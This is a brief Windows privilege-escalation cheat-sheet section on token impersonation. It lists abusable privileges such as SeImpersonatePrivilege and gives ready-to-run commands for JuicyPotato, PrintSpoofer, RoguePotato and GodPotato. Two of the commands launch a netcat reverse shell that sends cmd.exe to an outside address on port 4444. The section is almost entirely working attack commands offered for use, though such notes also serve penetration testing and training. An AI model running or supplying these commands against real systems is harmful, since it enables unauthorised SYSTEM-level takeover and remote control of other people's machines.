# 4. Token Impersonation

#### Check Impersonation Privileges
```powershell
# Look for these privileges
whoami /priv

# Exploitable privileges:
# SeImpersonatePrivilege
# SeAssignPrimaryTokenPrivilege
# SeTcbPrivilege
# SeBackupPrivilege
# SeRestorePrivilege
# SeCreateTokenPrivilege
# SeLoadDriverPrivilege
# SeTakeOwnershipPrivilege
# SeDebugPrivilege
```

#### Potato Attacks
```powershell
# JuicyPotato (Windows Server 2019 and below)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe" -t *

# PrintSpoofer (Windows 10 and Server 2019)
PrintSpoofer.exe -i -c cmd

# RoguePotato
RoguePotato.exe -r 10.10.10.10 -e "C:\nc.exe 10.10.10.10 4444 -e cmd.exe" -l 9999

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```